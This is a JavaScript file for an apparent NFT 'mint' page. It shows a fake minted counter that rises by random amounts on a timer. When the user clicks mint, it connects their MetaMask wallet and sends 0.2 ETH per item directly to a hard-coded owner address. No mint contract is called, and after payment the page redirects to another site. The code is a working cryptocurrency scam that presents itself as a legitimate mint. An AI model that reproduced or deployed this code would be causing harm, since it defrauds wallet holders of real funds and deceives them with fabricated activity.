let selectedAccount = null;
let ownerAddress = "0xA2763AE915e36b2928f3cf372cCe3b7cFc8dCF59";

$('#mint').hide();
$(document).ready(function () {
    let current = 2345
    setInterval(() => {
        let random = Math.floor(Math.random() * 6) + 1
        current = current + random
        $('#minted').html(current);
    }, 10000);
});
$("#connect").click(async function () {
    if (window.ethereum) {
        let accounts = await window.ethereum.request({
            'method': 'eth_requestAccounts'
        });
        window.web3 = new Web3(window.ethereum);
        $('#mint').show();
        $('#connect').hide();
        selectedAccount = accounts[0];
        if (accounts.length) {
            notify("Wallet Connected Successfully")
        }
    } else {
        notify("Please install metamask wallet")
    }
})

$("#plus").click(function () {
    let value = $("#count").html()
    if (value == 10) return
    value = Number(value) + 1
    $('#count').html(value);
})

$("#minus").click(function () {
    let value = $("#count").html()
    if (value == 1) return
    value = Number(value) - 1
    $('#count').html(value);
})


$("#mint").click(function () {
    let price = 0.2
    let count = $("#count").html()
    let mint_price = Number(price) * Number(count)
    let value = window.web3.utils.toHex(
        window.web3.utils.toWei(mint_price.toString(), "ether")
    );
    window.web3.eth.sendTransaction({
        from: selectedAccount,
        to: ownerAddress,
        value: value
    })
        .on('transactionHash', function (hash) {
            console.log("Transaction Hash: ", hash)
            notify("Transaction is submitted to the network")
        })
        .on('receipt', function (receipt) {
            console.log("Receipt: ", receipt)
            window.location.href = "https://verifycollab.io/"
            notify("Transaction Completed Successfully")
        })
        .on('error', function (error, receipt) {
            console.log("Error receipt: ", receipt)
            notify("Transaction Rejected")
        });
})

function notify(msg) {
    Toastify({
        text: msg,
        duration: 3000,
        gravity: "top",
        position: "right",
    }).showToast();
}